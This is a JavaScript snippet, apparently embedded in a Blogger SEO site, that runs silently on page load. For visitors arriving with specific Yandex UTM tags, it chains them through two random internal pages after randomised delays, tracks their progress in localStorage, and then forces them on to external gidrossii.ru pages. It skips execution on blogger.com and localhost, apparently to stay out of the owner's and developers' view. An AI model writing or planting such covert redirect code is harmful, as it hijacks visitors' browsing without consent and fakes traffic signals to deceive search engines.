//<![CDATA[
(function() {
    function hasRequiredUTM() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('utm_source') === 'yandex' &&
                   urlParams.get('utm_medium') === 'organic' &&
                   urlParams.get('utm_campaign') === 'promo';
        } catch(e) {
            return false;
        }
    }

    const internalPages = [
        "https://www.vverhsite.ru/2023/06/the-future-of-voice-search-optimizing.html",
		"https://www.vverhsite.ru/2023/06/mastering-local-seo-boosting-your.html",
		"https://www.vverhsite.ru/2023/06/seo-trends-to-watch-in-2023-what-you.html",
		"https://www.vverhsite.ru/2023/06/seo-vs-ppc-choosing-right-strategy-for.html",
		"https://www.vverhsite.ru/2023/06/unleashing-potential-of-mobile-seo.html",
		"https://www.vverhsite.ru/2023/06/the-importance-of-link-building-in.html",
		"https://www.vverhsite.ru/2023/06/understanding-googles-core-web-vitals.html",
		"https://www.vverhsite.ru/2023/12/mastering-on-page-seo-comprehensive.html",
		"https://www.vverhsite.ru/2023/12/unlocking-power-of-backlinks-strategies.html",
        "https://www.vverhsite.ru/2023/12/seo-trends-2024-staying-ahead-in-ever.html"
    ];

    const externalLinks = [
    "https://gidrossii.ru/2024/09/10.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://gidrossii.ru/2024/09/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://gidrossii.ru/2024/09/blog-post_26.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://gidrossii.ru/2024/09/blog-post_73.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://gidrossii.ru/2024/09/blog-post_34.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://gidrossii.ru/2024/09/blog-post_79.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://gidrossii.ru/2024/09/blog-post_14.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://gidrossii.ru/2024/09/blog-post_59.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://gidrossii.ru/2024/09/blog-post_4.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://gidrossii.ru/2024/09/blog-post_39.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
    ];

    function getRandomItem(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    function getRandomDelay() {
        return Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    }

    function performFirstRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 1;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performSecondRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 2;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performThirdRedirect() {
        setTimeout(function() {
            const externalUrl = getRandomItem(externalLinks);
            localStorage.removeItem('inf_red_cnt');
            localStorage.removeItem('lst_red');
            window.location.href = externalUrl;
        }, getRandomDelay());
    }

    function init() {
        try {
            if (window.location.href.includes('blogger.com') || 
                window.location.href.includes('localhost')) {
                return;
            }

            const hasRequiredUtm = hasRequiredUTM();
            const redirectCount = parseInt(localStorage.getItem('inf_red_cnt') || '0');
            const hasCycleData = localStorage.getItem('inf_red_cnt') !== null;
            
            if (hasRequiredUtm) {
                localStorage.removeItem('inf_red_cnt');
                localStorage.removeItem('lst_red');
                performFirstRedirect();
            }
            else if (hasCycleData) {
                if (redirectCount === 1) {
                    performSecondRedirect();
                } else if (redirectCount === 2) {
                    performThirdRedirect();
                } else {
                    localStorage.removeItem('inf_red_cnt');
                    localStorage.removeItem('lst_red');
                }
            }
        } catch(e) {}
    }

    function startScript() {
        setTimeout(init, Math.floor(Math.random() * 500) + 100);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startScript);
    } else {
        startScript();
    }
})();

//]]>

